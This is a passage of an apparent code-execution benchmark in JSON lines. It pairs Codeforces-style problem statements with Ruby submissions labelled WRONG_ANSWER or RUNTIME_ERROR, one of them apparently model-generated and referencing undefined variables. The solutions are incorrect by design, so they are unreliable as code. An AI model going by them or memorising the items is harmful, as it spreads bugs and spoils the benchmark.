is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.","sample_inputs":["4 2\n1 2 3 4","5 3\n5 5 7 3 1","2 3\n1 2"],"sample_outputs":["8","15","0"]}
{"difficulty":800,"lang":"Ruby 3","lang_cluster":"ruby","src_uid":"99_A","submission_id":"209472180","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"x, y = gets.strip.split(?.)\r\nif x % 10 == 9\r\n    puts 'GOTO Vasilisa.'\r\nelse\r\n   puts x.to_i +  (y[0] > ?4 ? 1 : 0)\r\nend","description":"In a far away kingdom lived the King, the Prince, the Shoemaker, the Dressmaker and many other citizens. They lived happily until great trouble came into the Kingdom. The ACMers settled there.Most damage those strange creatures inflicted upon the kingdom was that they loved high precision numbers. As a result, the Kingdom healers had already had three appointments with the merchants who were asked to sell, say, exactly 0.273549107 beer barrels. To deal with the problem somehow, the King issued an order obliging rounding up all numbers to the closest integer to simplify calculations. Specifically, the order went like this: If a number's integer part does not end with digit 9 and its fractional part is strictly less than 0.5, then the rounded up number coincides with the number\u2019s integer part.  If a number's integer part does not end with digit 9 and its fractional part is not less than 0.5, the rounded up number is obtained if we add 1 to the last digit of the number\u2019s integer part. If the number\u2019s integer part ends with digit 9, to round up the numbers one should go to Vasilisa the Wise. In the whole Kingdom she is the only one who can perform the tricky operation of carrying into the next position. Merchants found the algorithm very sophisticated and they asked you (the ACMers) to help them. Can you write a program that would perform the rounding according to the King\u2019s order?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single number to round up \u2014 the integer part (a non-empty set of decimal digits that do not start with 0 \u2014 with the exception of a case when the set consists of a single digit \u2014 in this case 0 can go first), then follows character \u00ab.\u00bb (a dot), and then follows the fractional part (any non-empty set of decimal digits). The number's length does not exceed 1000 characters, including the dot. There are no other characters in the input data.\n","output_spec":"If the last number of the integer part is not equal to 9, print the rounded-up number without leading zeroes. Otherwise, print the message \"GOTO Vasilisa.\" (without the quotes).\n","notes":null,"sample_inputs":["0.0\n","1.49\n","1.50\n","2.71828182845904523536\n","3.14159265358979323846\n","12345678901234567890.1\n","123456789123456789.999\n"],"sample_outputs":["0","1","2","3","3","12345678901234567890","GOTO Vasilisa."]}
{"difficulty":1400,"lang":"Ruby","lang_cluster":"ruby","src_uid":"9c30697e71102ae10c55c14d9c1db006","submission_id":"re_519","tags":["dp","implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"ss = gets.chomp\nif ss.slice(ss.length-1) == \".\"\n  puts \"NO\"\n  exit\nend\ns = ss.split(\".\")\nret = []\npp = \"\"\nfor i in 0..s.length-1\n   if s[i].length <= 0\n      ret = nil\n      break\n   end\n   if i == 0\n    if s[i].length > 8\n      ret = nil\n      break\n    end\n    pp = s[i]\n  elsif i == s.length-1\n    if s[i].length > 3\n      ret = nil\n      break\n    end\n    ret << pp + \".\" + s[i]\n  else\n    if s[i].length > 11 || s[i].length <= 1\n      ret = nil\n      break\n    end\n    if s[i].length == 2\n      ret << pp + \".\" + s[i].slice(0,1)\n      pp = s[i].slice(1,1)\n    elsif s[i].length == 3\n      ret << pp + \".\" + s[i].slice(0,2)\n      pp = s[i].slice(2,1)\n    else\n      ret << pp + \".\" + s[i].slice(0,3)\n      pp = s[i].slice(3,s[i].length-3)\n    end\n   end\nend\n\nif ret == nil\n    puts \"NO\"\nelse\n    puts \"YES\"\n    for i in 0..ret.length-1\n      puts ret[i]\n    end\nend\n\n\n","description":"Eudokimus, a system administrator is in trouble again. As a result of an error in some script, a list of names of very important files has been damaged. Since they were files in the BerFS file system, it is known that each file name has a form \"name.ext\", where:   name is a string consisting of lowercase Latin letters, its length is from 1 to 8 characters;  ext is a string consisting of lowercase Latin letters, its length is from 1 to 3 characters. For example, \"read.me\", \"example.txt\" and \"b.cpp\" are valid file names and \"version.info\", \"ntldr\" and \"contestdata.zip\" are not.Damage to the list meant that all the file names were recorded one after another, without any separators. So now Eudokimus has a single string.Eudokimus needs to set everything right as soon as possible. He should divide the resulting string into parts so that each part would be a valid file name in BerFS. Since Eudokimus has already proved that he is not good at programming, help him. The resulting file list can contain the same file names.","input_from":"standard input","output_to":"standard output","input_spec":"The input data consists of a single string s, its length is from 1 to 4\u00b7105 characters. The string can contain only lowercase Latin letters ('a' - 'z') and periods ('.').","output_spec":"In the first line print \"YES\" (without the quotes), if it is possible to divide s into parts as required. In this case, the following lines should contain the parts of the required partition, one per line in the order in which they appear in s. The required partition can contain the same file names. If there are multiple solutions, print any of them. If the solution does not exist, then print in a single line \"NO\" (without the quotes).","notes":null,"sample_inputs":["read.meexample.txtb.cpp","version.infontldrcontestdata.zip"],"sample_outputs":["YES\nread.m\neexample.t\nxtb.cpp","NO"]}
{"difficulty":1100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"9c90974a0bb860a5e180760042fd5045","submission_id":"re_985","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"#=================================\n# Better be sure than sorry. \n#=================================\n$stdin=File.open(\".\/input.txt\",\"r\") if ENV[\"LOGNAME\"]==\"skydos\"\nrequire 'prime'\nrequire 'mathn'\n#=================================\n\nn,m=gets.split.map(&:to_i)\n\nboard_main=[]\nboard_copy=[]\nn.times{\n\tline = gets.strip.split(\/\/)\n\tboard_main << line\n\tboard_copy << line.dup\n}\n\nfor i in 0...n\n\tfor j in 0...m\n\t\tch = board_main[i][j]\n\t\t\n\t\t# rows\n\t\tcount=0\n\t\tfor row_index in 0...n\n\t\t\tcount+=1 if board_main[row_index][j]==ch\n\t\tend\n\t\t\n\t\tif count!=1\n\t\t\tfor row_index in 0...n\n\t\t\t\tboard_copy[row_index][j]=\"_\" if board_main[row_index][j]==ch\n\t\t\tend\n\t\tend\n\t\t\n\t\t# cols\n\t\tcount=0\n\t\tfor col_index in 0...m\n\t\t\tcount+=1 if board_main[i][col_index]==ch\n\t\tend\n\t\t\n\t\tif count!=1\n\t\t\tfor col_index in 0...m\n\t\t\t\tboard_copy[i][col_index]=\"_\" if board_main[i][col_index]==ch\n\t\t\tend\n\t\tend\n\tend\nend\n\nfor i in 0...n\n\tfor j in 0...m\n\t\tprint board_copy[i][j]\n\tend\n\tputs\nend\n","description":"An African crossword is a rectangular table n\u2009\u00d7\u2009m in size. Each cell of the table contains exactly one letter. This table (it is also referred to as grid) contains some encrypted word that needs to be decoded.To solve the crossword you should cross out all repeated letters in rows and columns. In other words, a letter should only be crossed out if and only if the corresponding column or row contains at least one more letter that is exactly the same. Besides, all such letters are crossed out simultaneously.When all repeated letters have been crossed out, we should write the remaining letters in a string. The letters that occupy a higher position follow before the letters that occupy a lower position. If the letters are located in one row, then the letter to the left goes first. The resulting word is the answer to the problem.You are suggested to solve an African crossword and print the word encrypted there.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100). Next n lines contain m lowercase Latin letters each. That is the crossword grid.","output_spec":"Print the encrypted word on a single line. It is guaranteed that the answer consists of at least one letter.","notes":null,"sample_inputs":["3 3\ncba\nbcd\ncbc","5 5\nfcofd\nooedo\nafaoa\nrdcdf\neofsf"],"sample_outputs":["abcd","codeforces"]}
{"difficulty":1400,"lang":"Ruby","lang_cluster":"ruby","src_uid":"a37df9b239a40473516d1525d56a0da7","submission_id":"re_1377","tags":["combinatorics"],"exec_outcome":"WRONG_ANSWER","source_code":"inp = gets.split(\" \")\nn = inp[0].to_i\nm = inp[1].to_i\nl = Array.new(m){[]}\nfor i in 0..(n-1)\n  inp = gets\n  for j in 0..(m-1)\n    l[j] << inp[j]\n  end\nend\n\ncount = 1\nl.each do |arr|\n  arr.sort!\n  #p arr\n  unq = 1\n  curr = 0\n  while curr < (n - 1)\n    if arr[curr] != arr[curr+1]\n      unq += 1\n\tend\n\tcurr += 1\n  end\n  #puts unq\n  count *= unq\nend\n\nputs count","description":"One day little Vasya found mom's pocket book. The book had n names of her friends and unusually enough, each name was exactly m letters long. Let's number the names from 1 to n in the order in which they are written.As mom wasn't home, Vasya decided to play with names: he chose three integers i, j, k (1\u2009\u2264\u2009i\u2009&lt;\u2009j\u2009\u2264\u2009n, 1\u2009\u2264\u2009k\u2009\u2264\u2009m), then he took names number i and j and swapped their prefixes of length k. For example, if we take names \"CBDAD\" and \"AABRD\" and swap their prefixes with the length of 3, the result will be names \"AABAD\" and \"CBDRD\".You wonder how many different names Vasya can write instead of name number 1, if Vasya is allowed to perform any number of the described actions. As Vasya performs each action, he chooses numbers i, j, k independently from the previous moves and his choice is based entirely on his will. The sought number can be very large, so you should only find it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of names and the length of each name, correspondingly. Then n lines contain names, each name consists of exactly m uppercase Latin letters.","output_spec":"Print the single number \u2014 the number of different names that could end up in position number 1 in the pocket book after the applying the procedures described above. Print the number modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample Vasya can get the following names in the position number 1: \"AAB\", \"AAA\", \"BAA\" and \"BAB\".","sample_inputs":["2 3\nAAB\nBAA","4 5\nABABA\nBCGDG\nAAAAA\nYABSA"],"sample_outputs":["4","216"]}
{"difficulty":1000,"lang":"Ruby","lang_cluster":"ruby","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_1508","tags":["implementation","greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"s, cnt, k = gets.chomp, Array.new(26, 0), gets.to_i\ns.chars {|c| cnt[c.ord - 97] += 1}\ncnt.reject! {|c| c.zero?}\nputs k > s.length ? :impossible : k - cnt.length\n","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
{"difficulty":1000,"lang":"Ruby","lang_cluster":"ruby","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_674","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"n = gets.to_i\na = gets.split(' ').map(&:to_i).sort\nres = 0\nn.times do |i|\n  if a[i] != i+1; res += 1; end;\nend\np res\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"c31fed523230af1f904218b2fe0d663d","submission_id":"re_1513","tags":["implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"n,t=gets.split.map(&:to_i)\nbuilt=[]\nn.times{\n\tx,a=gets.split.map(&:to_i)\n\tbuilt<<[x-a\/2,x+a\/2]\n}\namount=2 #left and right most already possible\nbuilt.sort{|a,b|a[0]<=>b[0]}.each_cons(2){|(l,r)|amount+=r[0]-l[1]<=>t}\nputs amount+n-1\n","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2009\u2264\u2009n,\u2009t\u2009\u2264\u20091000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (\u2009-\u20091000\u2009\u2264\u2009xi\u2009\u2264\u20091000, 1\u2009\u2264\u2009ai\u2009\u2264\u20091000).","output_spec":"Output the amount of possible positions of the new house.","notes":"NoteIt is possible for the x-coordinate of the new house to have non-integer value.","sample_inputs":["2 2\n0 4\n6 2","2 2\n0 4\n5 2","2 3\n0 4\n5 2"],"sample_outputs":["4","3","2"]}
{"difficulty":1200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_420","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"class Drift\n  attr_reader :x, :y\n  attr_accessor :zone\n  def initialize(x, y)\n    @x = x\n    @y = y\n    @zone = nil;\n  end\nend\n\nn = gets.to_i\nmap = Array.new(n)\nfor i in 0...n\n  input = gets.split\n  map[i] = Drift.new(input[0].to_i, input[1].to_i)\nend\n\nz = 0\nfor i in 0...n\n  if map[i].zone == nil\n    map[i].zone = z\n    for j in (i+1)...n\n      map[j].zone = z unless map[i].x != map[j].x && map[i].y != map[j].y\n    end\n    z += 1\n  end\nend\nprint z-1","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":1100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"d526af933b5afe9abfdf9815e9664144","submission_id":"re_1426","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"\ufeffn = gets.chomp.to_i\na = gets.chomp.split(\" \").map{|e| e.to_i}\n\na << 0\na << 0\n\ndays = 0\nloop do\n  bang = false\n  for i in 0 .. (n - 2) do\n    bang = true if ! ((a[i] > 0 and (a[i + 1] > 0 or a[i + 2] > 0)) or (a[i] == 0 and a[i + 1] > 0))     \n  end\n  \n  break if bang\n  \n  days += 1\n \n  a.map!{|e|\n    e > 0 ? e -= 1 : e\n  }  \nend\n\nputs days\n","description":"In Berland the opposition is going to arrange mass walking on the boulevard. The boulevard consists of n tiles that are lain in a row and are numbered from 1 to n from right to left. The opposition should start walking on the tile number 1 and the finish on the tile number n. During the walk it is allowed to move from right to left between adjacent tiles in a row, and jump over a tile. More formally, if you are standing on the tile number i (i\u2009&lt;\u2009n\u2009-\u20091), you can reach the tiles number i\u2009+\u20091 or the tile number i\u2009+\u20092 from it (if you stand on the tile number n\u2009-\u20091, you can only reach tile number n). We can assume that all the opposition movements occur instantaneously.In order to thwart an opposition rally, the Berland bloody regime organized the rain. The tiles on the boulevard are of poor quality and they are rapidly destroyed in the rain. We know that the i-th tile is destroyed after ai days of rain (on day ai tile isn't destroyed yet, and on day ai\u2009+\u20091 it is already destroyed). Of course, no one is allowed to walk on the destroyed tiles! So the walk of the opposition is considered thwarted, if either the tile number 1 is broken, or the tile number n is broken, or it is impossible to reach the tile number n from the tile number 1 if we can walk on undestroyed tiles.The opposition wants to gather more supporters for their walk. Therefore, the more time they have to pack, the better. Help the opposition to calculate how much time they still have and tell us for how many days the walk from the tile number 1 to the tile number n will be possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009103) \u2014 the boulevard's length in tiles. The second line contains n space-separated integers ai \u2014 the number of days after which the i-th tile gets destroyed (1\u2009\u2264\u2009ai\u2009\u2264\u2009103). ","output_spec":"Print a single number \u2014 the sought number of days.","notes":"NoteIn the first sample the second tile gets destroyed after day three, and the only path left is 1\u2009\u2192\u20093\u2009\u2192\u20094. After day five there is a two-tile gap between the first and the last tile, you can't jump over it.In the second sample path 1\u2009\u2192\u20093\u2009\u2192\u20095 is available up to day five, inclusive. On day six the last tile is destroyed and the walk is thwarted.","sample_inputs":["4\n10 3 5 10","5\n10 2 8 3 5"],"sample_outputs":["5","5"]}
{"difficulty":1200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"d90da1e932a6aa546bec4e1bd4b1fbec","submission_id":"re_657","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"sn, sm = gets.chop.split(\/\\s+\/)\n\ncount = sn.to_i\ncountRelation = sm.to_i\n\ncosts = Array.new(0)\nscosts = gets.chop.split(\/\\s+\/)\n(0..count-1).each { |i|\n  costs[i] = scosts[i].to_i\n}\n\nrelations = Array.new()\n(0..count-1).each { |i|\n  relations[i] = Array.new()\n  (0..count-1).each { |j|\n    relations[i][j] = false\n  }\n}\n\n(0..countRelation-1).each { |i|\n  su, sv = gets.chop.split(\/\\s+\/)\n  u = su.to_i - 1;\n  v = sv.to_i - 1;\n  relations[u][v] = true\n  relations[v][u] = true\n}\n\nsolves = Array.new(0)\n\n(0..count-2).each { |row|\n  (row..count-2).each { |col|\n    if (relations[row][col] == true and relations[row][col+1] == true and relations[row+1][col+1] == true)\n      solves[solves.length] =  costs[row] + costs[col] + costs[col+1]\n    end\n  }\n}\n\nif (solves.length > 0)\n  puts solves.min\nelse\n  puts \"-1\"\nend","description":"A little boy Gerald entered a clothes shop and found out something very unpleasant: not all clothes turns out to match. For example, Gerald noticed that he looks rather ridiculous in a smoking suit and a baseball cap.Overall the shop sells n clothing items, and exactly m pairs of clothing items match. Each item has its price, represented by an integer number of rubles. Gerald wants to buy three clothing items so that they matched each other. Besides, he wants to spend as little money as possible. Find the least possible sum he can spend.","input_from":"standard input","output_to":"standard output","input_spec":"The first input file line contains integers n and m \u2014 the total number of clothing items in the shop and the total number of matching pairs of clothing items (). Next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the prices of the clothing items in rubles. Next m lines each contain a pair of space-separated integers ui and vi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u2009ui\u2009\u2260\u2009vi). Each such pair of numbers means that the ui-th and the vi-th clothing items match each other. It is guaranteed that in each pair ui and vi are distinct and all the unordered pairs (ui,\u2009vi) are different.","output_spec":"Print the only number \u2014 the least possible sum in rubles that Gerald will have to pay in the shop. If the shop has no three clothing items that would match each other, print \"-1\" (without the quotes).","notes":"NoteIn the first test there only are three pieces of clothing and they all match each other. Thus, there is only one way \u2014 to buy the 3 pieces of clothing; in this case he spends 6 roubles.The second test only has three pieces of clothing as well, yet Gerald can't buy them because the first piece of clothing does not match the third one. Thus, there are no three matching pieces of clothing. The answer is -1.In the third example there are 4 pieces of clothing, but Gerald can't buy any 3 of them simultaneously. The answer is -1.","sample_inputs":["3 3\n1 2 3\n1 2\n2 3\n3 1","3 2\n2 3 4\n2 3\n2 1","4 4\n1 1 1 1\n1 2\n2 3\n3 4\n4 1"],"sample_outputs":["6","-1","-1"]}
{"difficulty":800,"lang":"Ruby","lang_cluster":"ruby","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_1434","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"tot, min, min_index, input = gets.to_i, 20000, -1, gets.split(' ').map{|n| n.to_i}\ninput.each_cons(2).to_a.each_with_index { |(a, b), index| min, min_index = (a - b).abs, index if (((a - b).abs) < min) }\nmin_index = tot - 1 if (min > (input[0] - input[input.length - 1]).abs)\nmax_index = (min_index == tot - 1) ? 0 : min_index + 1\np (min_index + 1).to_s + ' ' + (max_index + 1).to_s","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
{"difficulty":2100,"lang":"Ruby","lang_cluster":"ruby","src_uid":"05f251de93536024c05fbd77ed01b70b","submission_id":"re_1394","tags":["dsu","number theory","dfs and similar","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"n,m=gets.chomp.split.collect{|a| a.to_i -1}\nputs (n.gcd(m)+1)","description":"Let's imagine: there is a chess piece billiard ball. Its movements resemble the ones of a bishop chess piece. The only difference is that when a billiard ball hits the board's border, it can reflect from it and continue moving.More formally, first one of four diagonal directions is chosen and the billiard ball moves in that direction. When it reaches the square located on the board's edge, the billiard ball reflects from it; it changes the direction of its movement by 90 degrees and continues moving. Specifically, having reached a corner square, the billiard ball is reflected twice and starts to move the opposite way. While it moves, the billiard ball can make an infinite number of reflections. At any square of its trajectory the billiard ball can stop and on that the move is considered completed.  It is considered that one billiard ball a beats another billiard ball b if a can reach a point where b is located.You are suggested to find the maximal number of billiard balls, that pairwise do not beat each other and that can be positioned on a chessboard n\u2009\u00d7\u2009m in size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (2\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009106).","output_spec":"Print a single number, the maximum possible number of billiard balls that do not pairwise beat each other. Please do not use the %lld specificator to read or write 64-bit numbers in C++. It is preferred to use cin (also you may use the %I64d specificator).","notes":null,"sample_inputs":["3 4","3 3"],"sample_outputs":["2","3"]}
{"difficulty":2600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"0ef5e0621f13107d0c8786766ae2ac56","submission_id":"re_503","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"A = a = gets.to_i\n\nx = 0\nwhile a % 12 == 0\n\ta \/= 12\n\tx += 1\nend\n\nb = [2, 13]\n300.times{b.push 13 * b[-1] - 12 * b[-2]}\ny = 0\ny += 1 while b[y] < a\n\nif b[y] != a\n\tputs :NO\nelse\n\tz = 2 * x + y\n\tc = []\n\t(0 .. z \/ 2).each{|i| c << b[z - 2 * i] * 12 ** i if i != x}\n\tputs :YES\n\tp 1, z + 1, c.size, *c\nend\n","description":"Berland scientists noticed long ago that the world around them depends on Berland population. Due to persistent research in this area the scientists managed to find out that the Berland chronology starts from the moment when the first two people came to that land (it is considered to have happened in the first year). After one Berland year after the start of the chronology the population had already equaled 13 people (the second year). However, tracing the population number during the following years was an ultimately difficult task, still it was found out that if di \u2014 the number of people in Berland in the year of i, then either di\u2009=\u200912di\u2009-\u20092, or di\u2009=\u200913di\u2009-\u20091\u2009-\u200912di\u2009-\u20092. Of course no one knows how many people are living in Berland at the moment, but now we can tell if there could possibly be a year in which the country population equaled A. That's what we ask you to determine. Also, if possible, you have to find out in which years it could be (from the beginning of Berland chronology). Let's suppose that it could be in the years of a1,\u2009a2,\u2009...,\u2009ak. Then you have to define how many residents could be in the country during those years apart from the A variant. Look at the examples for further explanation.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer A (1\u2009\u2264\u2009A\u2009&lt;\u200910300). It is guaranteed that the number doesn't contain leading zeros.","output_spec":"On the first output line print YES, if there could be a year in which the total population of the country equaled A, otherwise print NO.  If the answer is YES, then you also have to print number k \u2014 the number of years in which the population could equal A. On the next line you have to output precisely k space-separated numbers \u2014 a1,\u2009a2,\u2009...,\u2009ak. Those numbers have to be output in the increasing order. On the next line you should output number p \u2014 how many variants of the number of people could be in the years of a1,\u2009a2,\u2009...,\u2009ak, apart from the A variant. On each of the next p lines you have to print one number \u2014 the sought number of residents. Those number also have to go in the increasing order.  If any number (or both of them) k or p exceeds 1000, then you have to print 1000 instead of it and only the first 1000 possible answers in the increasing order. The numbers should have no leading zeros.","notes":null,"sample_inputs":["2","3","13","1729"],"sample_outputs":["YES\n1\n1\n0","NO","YES\n1\n2\n0","YES\n1\n4\n1\n156"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"139_B","submission_id":"gpt3_139_B_1","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"def calculate_cost(room, wallpapers)\n  min_cost = Float::INFINITY\n\n  # Calculate the perimeter of the room\n  perimeter = 2 * (room[0] + room[1])\n\n  # Iterate through each wallpaper type\n  wallpapers.each do |wallpaper|\n    # Calculate the number of rolls required\n    rolls = (perimeter.to_f \/ wallpaper[1]).ceil\n\n    # Calculate the cost of rolls\n    cost = rolls * wallpaper[2]\n\n    # Update the minimum cost if necessary\n    min_cost = [min_cost, cost].min\n  end\n\n  min_cost\nend\n\n# Calculate the minimum total cost for all rooms\ntotal_cost = rooms.map { |room| calculate_cost(room, wallpapers) }.sum\n\n# Print the minimum total cost\nputs total_cost\n","description":"Having bought his own apartment, Boris decided to paper the walls in every room. Boris's flat has n rooms, each of which has the form of a rectangular parallelepiped. For every room we known its length, width and height of the walls in meters (different rooms can have different dimensions, including height).Boris chose m types of wallpaper to paper the walls of the rooms with (but it is not necessary to use all the types). Each type of wallpaper is sold in rolls of a fixed length and width (the length, naturally, shows how long the unfolded roll will be). In addition, for each type we know the price of one roll of this type.The wallpaper of each type contains strips running along the length of the roll. When gluing the strips must be located strictly vertically (so the roll cannot be rotated, even if the length is less than the width). Besides, a roll can be cut in an arbitrary manner, but the joints of glued pieces should also be vertical. In addition, each room should be papered by only one type of wallpaper. And pieces of the same roll cannot be used to paper different rooms. That is, for each room the rolls are purchased separately. Also, some rolls can be used not completely.After buying an apartment Boris is short of cash, so he wants to spend the minimum money on wallpaper. Help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2264n\u2264500) \u2014 the number of rooms in Boris's apartment.\nEach of the next n lines contains three space-separated positive integers \u2014 the length, width and height of the walls in a given room in meters, respectively.\nThe next line contains a positive integer m (1\u2264m\u2264500) \u2014 the number of available wallpaper types.\nEach of the following m lines contains three space-separated positive integers \u2014 the length and width in meters of a given wallpaper and the price of one roll, respectively.\nAll numbers in the input data do not exceed 500. It is guaranteed that each room can be papered using these types of wallpaper.\n","output_spec":"Print a single number \u2014 the minimum total cost of the rolls.\n","notes":"Note to the sample:\nThe total length of the walls (the perimeter) of the room is 20 m.\nOne roll of the first type can be cut into pieces to get three vertical 1 meter wide strips, ergo you need 7 rolls of this type, the price equals 700.\nA roll of the second type can be cut into pieces to get five 2 meter wide strips, we need 2 rolls, the price is 640.\nOne roll of the third type can immediately paper 19 meters out of 20, but we cannot use other types and we have to buy a second roll, the price is 1000.\n","sample_inputs":["1\n5 5 3\n3\n10 1 100\n15 2 320\n3 19 500\n"],"sample_outputs":["640\n"]}
